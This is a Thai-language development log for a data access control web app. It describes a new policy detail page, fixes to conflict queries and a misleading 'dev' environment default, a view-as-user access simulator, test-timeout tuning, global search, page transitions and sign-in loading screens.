`App.tsx` เพิ่มเส้นทางที่สอง — เดิม `/policies/:id` เปิด `PolicyBuilderPage` ตรงๆ ซึ่งแปลว่า **แค่กดดูก็อยู่ในโหมดแก้แล้ว**

`pages/policies/PolicyDetailPage.tsx` (ใหม่, 629 บรรทัด) เรียง 5 ส่วน:

| ส่วน | มีอะไร |
|---|---|
| **In plain words** | สรุป policy เป็นภาษาคนจาก readback ตัวเดิม |
| **Configuration** | scope / effect / environment / lifecycle / allowLocalOverride เป็นแถว label–value |
| **Coverage** | `N tables · M columns` + ต้นไม้ table → column จัดกลุ่มด้วย `groupByTable()` + เหตุผลที่ match ต่อ target + ปุ่ม **Re-resolve** |
| **Conflicts** | overlap ทุกตัว เรียงตามความแรง + ป้าย relation + คำอธิบายเต็มประโยค + `overrideNote` |
| **History** | version list เดิม |

ปุ่มบนหัว: **Edit** (`Edit03` → `/policies/:id/edit`) · lifecycle transition · Re-resolve
ไม่มี input ในหน้านี้เลยแม้แต่ช่องเดียว — เป็นหน้าอ่าน

#### X.4 `overrideNote` — เคยคำนวณและมีเทสต์ แต่ไม่เคยไปถึงหน้าจอ

`PolicyOverview.overrideNote(...)` มีมาตั้งแต่ต้น แต่ signature เดิมรับ `Overlap` ซึ่งทำให้ **เรียกจากใน `overlaps()` ไม่ได้ เพราะตรงนั้นกำลังสร้าง `Overlap` อยู่** → ค่าเลยไม่เคยถูกใส่ลง record และไม่เคยออก API

แก้เป็น `overrideNote(Policy subject, String otherScopeLevel, boolean otherAllowsLocalOverride)` แล้วเรียกตอนประกอบแถว, เพิ่ม field ท้าย record, เพิ่มใน TS interface, และ render เป็นบรรทัดสีเตือนพร้อมไอคอน `AlertTriangle` ใต้คำอธิบาย

**ทำไมต้องเป็นสองบรรทัด ไม่ใช่รวมเป็นอันเดียว** — `explanation` บอกว่า *engine ทำอะไรตรงที่สองตัวเจอกัน* ส่วน `overrideNote` บอกว่า *ใครมีสิทธิ์แก้* (FR-3.1.4) สองอย่างนี้ขัดกันได้: policy สองตัวอาจเห็นพ้องกันสนิทวันนี้ แต่ข้อหลังยังเป็นตัวตัดสินว่าพรุ่งนี้ใครแก้ตัวไหนได้ — เขียนเป็นคอมเมนต์ไว้ในไฟล์แล้ว

#### X.5 ด้านกลับ — panel **Policies** ในหน้า asset

`AssetDetailPage.tsx` เพิ่ม `<Policies fqn>` ที่แยกสองหัวข้อตามที่ model แยกไว้จริง:

- **Subscription — who may read it**
- **Data — what is visible once they are in**

ว่างทั้งคู่ = **ไม่ใช่ข้อความกลางๆ** แต่เป็นคำเตือนสีส้มว่า *"No active policy reaches this asset, so nothing grants access to it. Access is denied by default…"* เพราะ default คือ deny การปล่อยให้ว่างเฉยๆ จะอ่านเหมือน "ไม่มีข้อจำกัด" ซึ่งตรงข้ามกับความจริง

แต่ละแถวบอก scope level ที่มันมาจาก และ **data policy บอก column ที่มันลงไปถึงจริง** — เจ้าของ table อยากรู้ว่า `email` โดน mask ไม่ใช่ว่า "มี masking policy อยู่ที่ไหนสักแห่ง"

#### X.6 สามบั๊กที่ integration test จับได้ — ทั้งหมดอยู่ในโค้ดของรอบนี้เอง

รอบนี้เป็นตัวอย่างว่าทำไมต้องรัน IT จริงก่อนบอกว่าเสร็จ (ดู What Didn't Work ข้อใหม่ด้วย — ครั้งแรกที่รันมัน**ไม่ได้รันจริง**แต่รายงานว่าผ่าน):

| บั๊ก | อาการ | ทำไมไม่มีใครเห็น | ที่แก้ |
|---|---|---|---|
| **1. `/conflicts` 500 ทุก policy** | `UnableToCreateStatementException: Missing named parameter '3'` | JDBI อ่าน `[1:3]` ใน `(array_agg(...))[1:3]` เป็น **named parameter ชื่อ `3`** — โค้ดคอมไพล์ผ่าน หน้าจอขึ้นแค่ error message ทั่วไป | ตัด slice ออกจาก SQL ไป cap ใน Java ด้วย `EXAMPLE_LIMIT = 3`; `count(*)` ยังนับครบเหมือนเดิม |
| **2. column บอกว่าตัวเองเป็นพ่อของตัวเอง** | `parentFqn` ของ `...customer.email` = `...customer.email` | `policy_binding.asset_id` ถูกเขียนเฉพาะแถว TABLE → `COALESCE(a.fqn, b.target_fqn)` ตกมาที่ค่าของตัวเอง ต้นไม้ยังดูปกติเพราะ `groupByTable()` แค่จัดกลุ่มผิด | เพิ่ม `LEFT JOIN asset ca ON ca.id = c.asset_id` แล้ว `COALESCE(a.fqn, ca.fqn, b.target_fqn)` |
| **3. เทสต์ยืนยันลำดับที่ไม่มีความหมาย** | `bothKinds` ใช้ `containsExactly(sub, mask)` | ไม่ใช่บั๊กของโค้ด — `activeFor` เรียง scope layer → depth → **name** ทั้งคู่อยู่ ORG ที่เหลือจึงเป็นตัวอักษร | เปลี่ยนเป็น `containsExactlyInAnyOrder` + คอมเมนต์ว่าทำไมลำดับข้าม type ไม่ใช่ข้อเท็จจริงที่ควรผูก |

บั๊กข้อ 1 คือ **ฟีเจอร์ที่ผู้ใช้สั่งมาโดยตรง และมันพังหมดตั้งแต่บรรทัดแรก** ถ้าไม่รัน IT จะไปเจอตอนเปิดหน้าจอ

---

### Y. ปิดช่องว่างข้อ 7 และ 8 ที่เพิ่งจดไว้ในรอบเดียวกัน

สองข้อนี้เป็นเศษที่เหลือจากข้อ X — เล็กทั้งคู่ แต่ข้อที่สองเป็นบั๊กที่ผู้ใช้จะไม่มีวันเห็นด้วยตาตัวเอง

#### Y.1 ลบ `CANNOT_LOOSEN` ทิ้ง ไม่ใช่ทำให้มันทำงาน

ทางเลือกมีสองทาง: ให้ `relate()` คืนค่านี้จริง หรือลบทิ้ง — **เลือกลบ** เพราะมันผิดหมวดตั้งแต่ต้น

`relation` ทุกค่าตอบคำถามเดียวกันคือ *"engine ทำอะไรตรงที่ policy สองตัวเจอกัน"* ส่วน "ใครมีสิทธิ์แก้ตัวไหน" (FR-3.1.4) เป็นคนละแกน และถูกตอบด้วย `overrideNote` ไปแล้วในข้อ X.4 — สองอย่างนี้ขัดกันได้โดยที่ทั้งคู่ถูก การยัดคำตอบของแกนหนึ่งเข้าไปเป็นค่าหนึ่งของอีกแกนจะทำให้ policy ที่ compose กันสนิทแต่แก้ไม่ได้ ถูกจัดอันดับว่า "ชนกันแรงกว่า" ตัวที่ compose กันสนิทและแก้ได้ ซึ่งไม่จริง

ลบออกจากสามที่: `RELATION_ORDER` (Java), union `PolicyRelation` (TS), และตาราง `RELATION` ในหน้า Policy พร้อมเลื่อน `rank` ที่เหลือ · เขียนคอมเมนต์เหนือตารางไว้ว่าทำไมแกน "ใครแก้ได้" ไม่อยู่ในนี้

#### Y.2 builder default `environment` จาก `dev` → `prod`

**บั๊กเดิม:** policy ที่เขียนด้วยค่า default ล้วนๆ ถูกเก็บเป็น `dev` แต่ engine ตัดสินที่ `prod` → มัน **save ได้ activate ได้ โผล่ในทุก list และไม่เคยถูก enforce สักครั้ง** ไม่มี error ไม่มีหน้าจอว่าง ไม่มีอะไรผิดให้เห็น

**ทำไม default เป็น `prod` ถึงปลอดภัย:** สิ่งที่ทำให้ policy มีผลคือ lifecycle ไม่ใช่ field นี้ — `PolicyStore.create()` สร้างทุกตัวเป็น `DRAFT` เสมอ และต้องมีคนกด transition ไป `ACTIVE` การกดนั้นคือการตัดสินใจที่ตั้งใจ ส่วน field นี้ไม่ควรเป็นการตัดสินใจที่สองที่ไม่มีใครรู้ตัวว่ากำลังทำอยู่

แก้สามจุด:
- `api/policies.ts` เพิ่ม **`ENFORCED_ENVIRONMENT`** เป็นค่าคงที่ตัวเดียว (สะท้อน `DecisionService.DEFAULT_ENVIRONMENT`) แล้วให้ `fetchPoliciesForAsset` / `fetchPoliciesAffecting` / builder ใช้ร่วมกัน — บั๊กทั้งตระกูลนี้เกิดจาก literal `'dev'`/`'prod'` หลายก๊อปปี้ที่ drift จากกัน
- `EMPTY.environment` = `ENFORCED_ENVIRONMENT`
- ตัวเลือกในดรอปดาวน์มี hint ต่อค่า (`dev` / `uat` = *Authoring only — not enforced*, `prod` = *The environment the engine enforces*) **และ** มีคำเตือนใต้ field ที่ขึ้น**เฉพาะตอนเลือกค่าที่ engine ไม่อ่าน** — hint ที่อยู่ในดรอปดาวน์หายไปพร้อมดรอปดาวน์ ส่วนคำเตือนที่ขึ้นทุกครั้งคือคำเตือนที่ไม่มีใครอ่านตอนที่มันสำคัญ

#### Y.3 เทสต์

`PolicyBuilderPage.test.tsx` (ใหม่, 2 ตัว) — ค่า default ของ field นี้ต้องถูก **assert** ไม่ใช่ปล่อยให้เชื่อ เพราะค่าที่ผิดของมันไม่แสดงอาการอะไรเลย
- policy ใหม่เปิดมาที่ environment ที่ engine enforce
- เลือก `dev` แล้วต้องมีคำเตือน · ตอนอยู่ที่ `prod` ต้องไม่มี

---

### Z. View-as-user / Simulator (FR-5.2) — ปิดแล้ว

> แผนเขียนถึงฟีเจอร์นี้ว่า *"ฟีเจอร์นี้คือสิ่งที่ทำให้ทีม data กล้าใช้ระบบ ถ้าไม่มีจะไม่มีใครกล้า apply"*

#### Z.1 backend ไม่ต้องแตะเลย — สำรวจก่อนเขียน แล้วพบว่ามีครบอยู่แล้ว

ก่อนเริ่มได้ไล่ดู backend ทั้งเส้นทาง แล้วพบว่า **FR-5.2 ฝั่ง backend เสร็จไปแล้วตั้งแต่ M3**:

| ของที่มีอยู่แล้ว | ที่ไหน |
|---|---|
| `POST /api/v1/decisions` รับ `{principal, assetFqn, at, ip, purpose, environment}` | `DecisionResource.java` |
| gate การถามแทนคนอื่น: ต้องเป็น PLATFORM_ADMIN / POLICY_AUTHOR / DATA_OWNER / AUDITOR | `DecisionResource.decide()` |
| `POST /api/v1/query` + `asPrincipal` (รันจริงในฐานะคนอื่น ไม่ใช่ preview) | `QueryResource.java` |
| register ทั้งคู่ | `DacApplication.java:212-213` |

→ **รอบนี้เป็นงาน frontend ล้วน ไม่มี migration ไม่มี Maven build** · `DecisionService` เขียนคอมเมนต์ดักไว้ตั้งแต่ต้นแล้วว่า *"every runtime path — the simulator (FR-5.2), the query proxy (FR-6.3), the compilers — goes through it so that a decision shown in a preview is the same object that governs a query"* ซึ่งเป็นเหตุผลที่หน้านี้ **ไม่ได้จำลองอะไรเลย** มันแสดง decision ตัวจริง

#### Z.2 ไฟล์ที่เพิ่ม/แก้

- **`api/decisions.ts` (ใหม่)** — `simulate(ask)` บาง ๆ ทับ `POST /v1/decisions` · default `environment` เป็น `ENFORCED_ENVIRONMENT` ตัวเดียวกับที่ builder ใช้ (ผลพลอยได้จากข้อ Y.2 — ถ้ายังเป็น literal `'dev'` หน้านี้จะตอบคนละ policy set กับที่ engine บังคับใช้ โดยไม่มีอะไรบอก)
- **`pages/simulator/SimulatorPage.tsx` (ใหม่, ~560 บรรทัด)**
- **`App.tsx`** — route `/simulator`
- **`layout/navigation.ts`** — Simulator `milestone: 'M4'` → `null` (nav จองที่ไว้แล้ว เหลือแค่ปลดป้าย)
- **`pages/catalog/AssetDetailPage.tsx`** — ปุ่ม **View as someone** บน header → `/simulator?asset=<fqn>` · ใช้ `onPress` + `navigate()` ตามแบบที่หน้า Policy ใช้ **ไม่ใช่ `href`** (ซึ่งจะ reload ทั้งหน้า)
- **`shot-simulator.mjs`** — สคริปต์ถ่ายภาพหน้าจอ 3 คน (gitignore อยู่แล้ว)

#### Z.3 การตัดสินใจที่สำคัญ 4 ข้อ

**(ก) projection ไล่จาก column ของ catalog ไม่ใช่จาก mask list**
ถ้าไล่จาก `columnMasks` หน้าจอจะบอกได้แค่ "อะไรถูก mask" แต่ **สิ่งที่คนเปิดหน้านี้มาหาคือ column ที่ *ไม่* ถูก mask** — `citizen_id · as stored` คือบรรทัดที่ทำให้มีคนไปเขียน policy ส่วน mask list ไม่มีทางแสดงมันได้เลย · ใช้ `queryKey: ['catalog-asset', fqn]` **ตัวเดียวกับ AssetDetailPage** → เปิดต่อกันเสียคำขอเดียว

**(ข) แยก "matched" ออกจาก "decisive" และ **สลับข้างตามผลลัพธ์**
เวอร์ชันแรกใช้ `reason.matched` เป็นตัวตัดสินว่าอันไหนสำคัญ — **ผิด และเห็นชัดตอนถ่ายภาพหน้าจอ analyst_b จริง**: หน้าจอ deny แต่ขึ้น policy สีเขียว `allow` เป็นเหตุผลหลัก ส่วนสองประโยคที่ตอบคำถามจริง (`expression is false for this principal: user.country == asset.prop('dataResidency')` / `attribute condition not satisfied: clearance lt L2`) ถูกยุบอยู่ใต้สามเหลี่ยม

กติกาที่ถูกคือ **เหตุผลที่ "สำคัญ" คือเหตุผลที่เถียงไปทางผลลัพธ์** และมันกลับข้างกับผลลัพธ์:
- **allow** → decisive = `matched`
- **deny** → decisive = `!matched || effect === 'DENY'` เพราะ policy ที่ *ไม่* match คือสิ่งที่กันไว้ ส่วน policy ที่ match ไม่ได้ทำให้ถูก deny
- reason ที่ **ไม่มี `policyId`** (`(composition)`) ไม่ใช่ policy — มันคือประโยคของ engine เองว่าชั้นต่างๆ รวมกันแล้วได้อะไร → ขึ้นบนสุดของ deny เสมอ
- ป้าย effect ระบายสีตาม**สิ่งที่เกิดขึ้น** ไม่ใช่ตามที่ policy ประกาศ: ไม่ match = เทา + คำว่า *"would allow, did not match"* · สีเขียว `allow` ข้างประโยค "expression is false" คือการพูดความจริงที่ถูกอ่านเป็นตรงข้าม

**(ค) deny แล้วไม่แสดง projection เลย**
สิ่งที่ *จะ* ถูก mask ถ้าเข้าถึงได้ ไม่ใช่คำตอบฉบับย่อของ deny — มันเป็นคนละคำตอบ และการโชว์มันชวนให้สรุปผิด

**(ง) datalist ไม่ใช่ dropdown**
ทั้งรายชื่อคนและรายชื่อ table ยาวเท่าองค์กร · datalist พิมพ์กรองได้ **และยังรับชื่อที่ไม่อยู่ในลิสต์** ซึ่งสำคัญ เพราะ "principal ที่ระบบไม่รู้จัก" เป็นคำถามที่ถูกต้อง และคำตอบคือ denial ที่บอกเหตุผลนั้นตรงๆ

#### Z.4 field `at` / `ip` / `purpose` มีไว้ทำไม

policy ที่เปิดหน้าต่าง 08:00–18:00 และ policy ที่ผูกกับ IP range **ทดสอบไม่ได้เลย** ถ้าเวลาที่ถามได้มีแค่ "ตอนนี้" และ IP มีแค่ของตัวเอง · นี่คือสิ่งที่เปลี่ยน "เราคิดว่ามันน่าจะ deny นอกเวลา" ให้เป็นของที่ใครก็ตรวจได้ในไม่กี่วินาที · `at` ถูกแปลงเป็น ISO instant ก่อนส่ง และ URL ถูก sync (`?principal=&asset=`) เพื่อให้ **deny ที่มีคนไม่เห็นด้วย ส่งเป็นลิงก์ได้** ไม่ใช่ส่งเป็นคำอธิบายว่าให้กรอกช่องไหนบ้าง

#### Z.5 เทสต์ + ยืนยันกับของจริง

`SimulatorPage.test.tsx` (ใหม่, **10 ตัว**) — column ที่ไม่มี mask ต้องโผล่ · deny ต้องไม่โชว์ projection · **deny ต้องนำด้วยสิ่งที่กันไว้ ไม่ใช่สิ่งที่ match** (กันข้อ ข ไม่ให้กลับมา) · policy ที่ดูแล้วไม่เข้าเงื่อนไขต้องถูกยุบ · unenforceable ต้องพูดออกมา · ไม่กรอกครบต้องกดไม่ได้ · `describePredicate` 4 ตัว

**ยิงจริงกับ backend ที่รันอยู่** (`demo-pg.salesdb.sales.customer`) — ตรงกับ manual E2E ข้อ 9 ของแผนเป๊ะ:

| คน | ผลจาก engine | หน้าจอแสดง |
|---|---|---|
| `analyst_a` | allow · `citizen_id` PARTIAL(5) · `email` REGEX · rows `branch_code IN (BKK-01)` | 7 as stored · 2 masked · 0 hidden · *"Only rows where branch_code is BKK-01."* |
| `analyst_b` | deny (`user.country != dataResidency`, `clearance lt L2`) | ไม่มี projection · Why นำด้วยประโยค composition |
| `steward_c` | allow · ไม่มี mask · rows `IN (BKK-01, CNX-01)` | 9 as stored · 0 masked · *"is one of BKK-01, CNX-01."* |

> **กับดักที่เจอระหว่างทาง:** backend ที่รันค้างอยู่พ่น `ClassNotFoundException` ของคลาสที่อยู่ใน jar ตัวเอง — ไม่ใช่บั๊กโค้ด แต่เพราะ **`verify` เขียนทับ jar ใต้ JVM ที่เปิดไฟล์นั้นค้างไว้** classloader จึงโหลดคลาสที่ยังไม่เคยโหลดไม่ได้ → **restart backend ทุกครั้งหลัง build ก่อนจะยิงทดสอบ** ไม่งั้นจะไล่หาบั๊กที่ไม่มีอยู่จริง

#### Z.6 เทสต์ที่ล้มไม่ซ้ำชุดกัน — สองนาฬิกาที่ต้องตั้งทั้งคู่

รอบนี้ full suite **ล้มคนละชุดกันสามรอบติด** (6 → 4 → 2 suites) ทั้งที่โค้ดไม่ได้เปลี่ยนระหว่างรอบ · suite ที่ล้มคือ suite ที่ใช้เวลา 90–114 วินาที เสมอ

สาเหตุไม่ใช่โค้ด: `findBy*` **ตัวแรก**ของแต่ละ suite เป็นคนจ่ายค่า ts-jest type-check + compile ของ design system ทั้งกอง (ไม่ cache ข้าม worker) → พอเครื่องมีโหลด (JVM + Vite dev + jest 16 suites พร้อมกัน) งบหมดไปกับการคอมไพล์ก่อนที่ component จะได้ render อะไรเลย

**มีนาฬิกาสองตัว และต้องตั้งทั้งคู่ — ตั้งตัวเดียวแล้วอาการย้ายที่เฉยๆ:**

| นาฬิกา | default | ตั้งที่ | อาการตอนหมดเวลา |
|---|---|---|---|
| งบต่อเทสต์ของ jest | **5s** | `jest.config.cjs` → `testTimeout: 30000` | `Exceeded timeout of 5000 ms for a test` |
| งบของ `findBy*` เอง (คนละตัวกับข้างบน) | **1s** | `src/setupTests.ts` → `configure({ asyncUtilTimeout: 15000 })` | `Unable to find an element with the text: …` + dump DOM ที่ยัง render ไม่เสร็จ |

ตัวที่สองหลอกที่สุด เพราะข้อความมันอ่านเหมือน **assertion ผิด** ไม่ใช่ timeout — DOM ที่ dump ออกมาคือหน้าจอครึ่งเดียวที่ render ทันในหนึ่งวินาที ไม่ใช่หน้าจอสุดท้าย

> **timeout ที่ยิงตอนคอมไพล์ไม่ได้บอกอะไรเกี่ยวกับโค้ด** — รอนานขึ้นสำหรับ element ที่กำลังจะมา ไม่มีต้นทุน ส่วน element ที่ไม่มีวันมาก็ยังล้มอยู่ดี แค่ช้าลง

---

## รอบก่อนหน้า — Global search ข้ามทุก entity + transition ตอนเปลี่ยนหน้า/เข้า-ออกระบบ + ชิป governance ที่อ่านออก

> รอบนี้เพิ่ม **endpoint ใหม่หนึ่งตัว** (`GET /api/v1/search`) และงาน UX ล้วนๆ อีกสามเรื่องที่ผู้ใช้สั่งระหว่างทาง
> milestone ไม่ขยับ แต่ search เป็นของที่ M1 ค้างไว้ (ก่อนหน้านี้ช่องค้นหาบน header แค่พาไปหน้า Catalog พร้อม query string)

### A. Global search — ค้นได้ทุกชนิด ไม่ใช่แค่ asset

**โจทย์จากผู้ใช้:** *"search ข้างบน ให้ Search ได้ทั้งหมดอะ Term, tag, domain ,..."*

**Backend — `backend/dac-service/src/main/java/com/mfec/dac/catalog/SearchQuery.java` (ใหม่)**

`UNION ALL` เก้า branch ในคิวรีเดียว แล้ว rank รวมกันทั้งก้อน:

| branch | ตาราง | `kind` | `facet_type` ที่คืน |
|---|---|---|---|
| asset | `asset` (`is_current`) | `asset` | – |
| column | `asset_column` ⨝ `asset` | `column` | – |
| tag | `tag` | `tag` | `tags` |
| classification | `classification` | `classification` | `classifications` |
| glossary term | `glossary_term` | `term` | `terms` |
| glossary | `glossary` | `glossary` | `glossaries` |
| domain (รวม sub-domain) | `domain` | `domain` | `domains` |
| data product | `data_product` | `dataProduct` | `dataProducts` |
| policy (ไม่เอา `ARCHIVED`) | `policy` | `policy` | – |

- **rank ต้องเป็น global** ถึงจะเรียงถูก: exact name = 0 · name prefix = 1 · fqn prefix = 2 · ที่เหลือ = 3 · เท่ากันแล้วตัดด้วย `length(name)` (match ใน `customer` ตรงกว่า match ใน `customer_address_history_archive`) → นี่คือเหตุผลที่ใช้ `UNION ALL` ก้อนเดียว ไม่ใช่ยิงเก้าคิวรีแล้วเอามาต่อกันฝั่ง Java
- branch ของ **vocabulary ทั้งหกสร้างจาก template เดียว** (`vocabulary(kind, table, facetType, parentColumn)`) พร้อม `LEFT JOIN` นับ `asset_facet` → ไม่ต้องเขียนซ้ำหกรอบแล้วปล่อยให้ค่อยๆ ต่างกัน
- **column match เฉพาะ `name` ไม่ match `fqn`** — เพราะ fqn ของ column ลงท้ายด้วย fqn ของ table คำว่า `cus` จึงจะลาก column ทั้ง 40 ตัวของ `customers` ขึ้นมากลบตัว table เอง (เจอตอนเทสจริง แล้วแก้)
- ตั้งใจ **ไม่ใช้ full-text (`tsvector`)** — ของพวกนี้เป็น identifier ไม่ใช่ prose คนพิมพ์ `cust` แล้วคาดหวัง prefix ไม่ใช่ lexeme · ถ้าโตเกิน `ILIKE` คำตอบคือ OpenSearch ตามแผน Phase 1.5 ไม่ใช่ index ที่แย่กว่าเดิมในนี้
- `q` สั้นกว่า 2 ตัวอักษร → คืน list ว่างทันที ไม่แตะ DB · `limit` cap ที่ 50

**`resources/SearchResource.java` (ใหม่)** — `GET /api/v1/search?q=&limit=` `@Secured` · แยกจาก `/v1/catalog/assets?search=` ตั้งใจ: อันนั้น filter ตารางและ paginate อันนี้ตอบ "ของชื่อนี้อยู่ไหน" แล้ว cap สั้น · รวมกันแปลว่าหน้า Catalog ต้องจ่ายค่า UNION อีกแปด branch ทุกครั้งที่เปลี่ยนหน้า

ลงทะเบียนใน `DacApplication.run()` ต่อจาก `GovernanceResource`

**Frontend**
- `frontend/app/src/api/search.ts` (ใหม่) — type `SearchHit` / `SearchKind` · `hitHref(hit)` ตัดสินปลายทาง: asset → `/catalog/<fqn>` · column → หน้า table ที่มันอยู่ (`parentFqn`) · policy → `/policies/<id>` · vocabulary → `/catalog?facet=<facetType>:<fqn>` (**ไปที่ข้อมูลที่ติด value นั้น ไม่ใช่หน้าอธิบาย value**) · `KIND_GROUPS` คุมลำดับหัวข้อ
- `layout/TopNav.tsx` → `GlobalSearch` เขียนใหม่เป็น **type-ahead** : debounce 200ms, ขั้นต่ำ 2 ตัวอักษร, TanStack Query `staleTime` 30s, `placeholderData` ไว้กัน list กระพริบตอนพิมพ์ต่อ
  - ผลลัพธ์จัดกลุ่มตาม kind แต่เก็บ flat list คู่กันไว้ให้ **ลูกศรขึ้น/ลงเดินตามที่ตาเห็น** (วนรอบ) · Enter เปิดตัวที่เลือก · ถ้ายังไม่ได้เลือกอะไร Enter ยังพาไป `/catalog?q=` เหมือนเดิม · Esc ปิด
  - **ทิ้ง dropdown `SCOPES` (All/Tables/Views/…) ไปแล้ว** — ตอนนี้ผลลัพธ์ข้ามชนิดอยู่แล้ว การให้เลือก asset type ก่อนค้นขัดกับโจทย์ และหน้า Catalog ก็ยังมี filter นั้นของตัวเอง
  - spinner **แทนที่** ปุ่มแว่นขยาย ไม่ใช่โผล่ข้างๆ ไม่งั้นความกว้างช่องกระตุกทุกคีย์
  - แถวผลลัพธ์ผูก `onMouseDown` + `preventDefault()` ไม่ใช่ `onClick` — ไม่งั้น blur ของ input ปิด panel ทิ้งก่อนคลิกจะลง

### B. Transition ตอนเปลี่ยนหน้า

**โจทย์:** *"เวลาเปลี่ยน Tab ให้มี transition load ด้วย"* แล้วตามด้วย *"ตอนนี้มันแวบเร็วไป"*

**โจทย์เพิ่มรอบที่สาม:** *"ทำไมเวลาเปลี่ยนหน้า มันเปลี่ยนเลย แล้วค่อยมีแวบๆ Transition"* — เวอร์ชันแรกหน่วงไม่จริง เนื้อหาสลับทันทีแล้ว transition ค่อยเล่นตามหลัง (ดู What Didn't Work) · **เขียนใหม่ทั้งกลไก**

**กลไกที่ถูก — หน่วง "location" ไม่ใช่หน่วง "children"**

`frontend/app/src/layout/RouteTransition.tsx` (เขียนใหม่) แยกเป็นสามชิ้น:

| export | อยู่ที่ไหน | ทำอะไร |
|---|---|---|
| `useRouteLag()` | เรียกใน `App.tsx` **เหนือ `<Routes>`** | คืน `{ display, loading }` — `display` คือ location ที่ตามหลัง address bar อยู่ `HOLD_MS` |
| `RouteProgress` | `App.tsx` เหนือ `<Routes>` | บาร์บนสุด ขับด้วย location **จริง** → ขึ้นตั้งแต่วินาทีที่คลิก |
| `RouteTransition` (default) | ครอบ `<Outlet />` ใน `AppShell` | เหลือแค่ `<div className="arak-page-enter" key={pathname+search}>` เฉยๆ ไม่มี timer แล้ว |

`App.tsx` เปลี่ยนเป็น **`<Routes location={display}>`**

- **หัวใจ:** `<Outlet />` resolve จาก router context ตอน render → **เก็บ element เก่าไว้ก็ไม่ช่วย** element เดิมมันก็ render หน้าใหม่อยู่ดี · ทางเดียวที่จะค้างหน้าเก่าได้จริงคือ **ค้าง location ที่ใช้ render**
- `useRouteLag()` **ต้องเรียกเหนือ `<Routes location=...>`** เพราะ react-router จะห่อ `LocationContext.Provider` ใหม่ให้ทุกอย่างที่อยู่ข้างใน (ยืนยันจาก `useRoutesImpl` ใน `react-router@6.30.6`) ถ้าเรียกข้างในมันจะอ่านค่าที่ตัวเองผลิต แล้วค้างตายอยู่กับที่
- **ผลพลอยได้:** `useLocation()` ใน `AppShell` ก็เป็นตัวหน่วงด้วย → **highlight ของ nav ขยับพร้อมหน้าที่มาถึงจริง** ไม่ใช่ขยับก่อนเนื้อหา (แบบเดียวกับตอนโหลดหน้าเว็บจริง)
- **`HOLD_MS = 420`** — หน้าที่คลิกออกมาค้างไว้ 420ms ระหว่างบาร์วิ่ง แล้วหน้าใหม่ค่อย mount + `arak-page-enter` (320ms) · คลิกซ้ำระหว่างหน่วง → อ่าน `latest` ref ตอนครบเวลา จึงไปหน้าที่กด**ล่าสุด** ไม่ใช่หน้าที่เริ่มหน่วง
- บาร์อยู่ต่อหลังสลับ จนกว่า **`useIsFetching() === 0`** → เข้าหน้าที่ query ช้า 2 วิ บาร์ก็อยู่ 2 วิ ไม่ใช่ประกาศชัยชนะแล้วโชว์ตารางเปล่า · เพดาน `CEILING_MS = 4000` วัดจาก `startedAt` ref (ไม่ใช่ `setTimeout` ที่จะถูกรีทุกครั้งที่ `fetching` ขยับ)
- render แรกของแอปไม่มี transition — `display` ตั้งต้นเท่ากับ location จริงอยู่แล้ว ไม่ต้องมี `first` ref อีก
- progress bar บางๆ ติดขอบบน (`z-100`) วิ่งไปหยุดที่ **88%** ด้วย easing ที่โหลดหนักช่วงต้น (ตอบสนองทันทีว่า "กดติดแล้ว") แล้วคลานต่อ → พอเสร็จจึงวิ่งไป 100% แล้วค่อย fade · บาร์ที่ถึงปลายแล้วค้างคือบาร์ที่โกหก

### C. Loading ตอน Sign in / Sign out

**โจทย์:** *"เวลา Sign in Sign out ให้มี Loading ออกแบบให้หน่อย"* แล้วตามด้วย *"ตอน Sign in หน้ามันแวบๆ ก่อนไปเจอ loading screen อะ"*

`frontend/app/src/auth/AuthSplash.tsx` (ใหม่) — ม่านเต็มจอ: โลโก้เต้นเบาๆ + หัวข้อ + บรรทัดบอกว่ากำลังทำอะไร + แถบ sweep แบบ indeterminate (ไม่มีใครรู้เปอร์เซ็นต์ บาร์ที่เดาตัวเลขคือบาร์ที่โกหก) · ค้าง `AUTH_SPLASH_MS = 900`

- ขับด้วย zustand store เล็กๆ (`useAuthSplash`) เพราะสองปลายอยู่คนละที่: ฟอร์ม login ยกม่าน, เมนู account บน header ก็ยกม่าน, ส่วนตัวที่วาดต้องอยู่ **เหนือ `<Routes>`** ใน `App.tsx` ไม่งั้นมันจะถูก unmount โดย navigation ที่มันกำลังคลุมอยู่
- **Sign out** — ยกม่านก่อน แล้วค่อย `signOut()` หลัง 900ms · ถ้าล้าง session ก่อน เมนู/shell/หน้าทั้งหมด unmount พร้อมกันแล้วหน้า login มาถึงก่อนใครจะทันเห็นว่าเกิดอะไร
- **Sign in — บั๊กที่ผู้ใช้ชี้** รอบแรกยกม่าน *หลัง* `await signIn()` สำเร็จ (เหตุผลตอนนั้น: รหัสผิดจะได้ไม่เห็น "Signing you in" แล้วโดนดึงกลับ) · **ผลคือมีเฟรมหนึ่งที่ token มีแล้วแต่ม่านยังไม่ขึ้น** → `<Navigate>` ใน `LoginPage` ยิงทันที หน้า guarded layout วาดแลบผ่านช่องนั้น = อาการ "แวบๆ ก่อนเจอ loading screen"
  **แก้:** ยกม่าน **ตั้งแต่กด submit** · รหัสผิด → `splash.hide()` ทันทีแล้วโชว์ error บนฟอร์ม
- keyframes ทั้งหมดอยู่ใน `theme/overrides.css` (`arak-page-enter`, `arak-progress-creep`, `arak-progress-finish`, `arak-splash-*`) พร้อม `@media (prefers-reduced-motion: reduce)` ที่ **หยุดการเคลื่อนไหวแต่ยังคงตัวบ่งชี้ไว้**

### D. Copyright ในราง — ชิดซ้าย

**โจทย์:** *"© 2026 MFEC / All rights reserved จัดวางไปสวย ชิดซ้านได้ไหม"* → `AppShell.tsx` เปลี่ยนจาก `text-center` เป็นชิดซ้ายบน gutter `px-3.5` เดียวกับ label ของ nav ด้านบน เส้นคั่นเยื้องเข้า `mx-3.5` ให้ตรงกัน → รางอ่านเป็นคอลัมน์เดียว

### E. ชิป governance บนแถว Catalog — อ่านไม่ออก

**โจทย์:** *"ตรงนี้ไม่สวยเลย ดูลำบาก"* (แนบสองรูป) — แถว filter พิมพ์ FQN ของ domain ยาว 110 ตัวอักษรจนตัดบรรทัด และการ์ด asset หนึ่งใบมี **11 ชิป** ที่พูดเรื่องเดียวกันซ้ำๆ (`PII ↑`, `Tier ↑`, domain สามชั้น, `PII.Sensitive`, `Tier.Tier2`, `Tier2`, …)

อาการเดียวแต่มาจาก **สามสาเหตุ** จึงแก้แยกกันสามที่:

| สาเหตุ | แก้ที่ไหน |
|---|---|
| พิมพ์ FQN เต็ม | `frontend/app/src/lib/fqn.ts` (ใหม่) — `shortFqn()` |
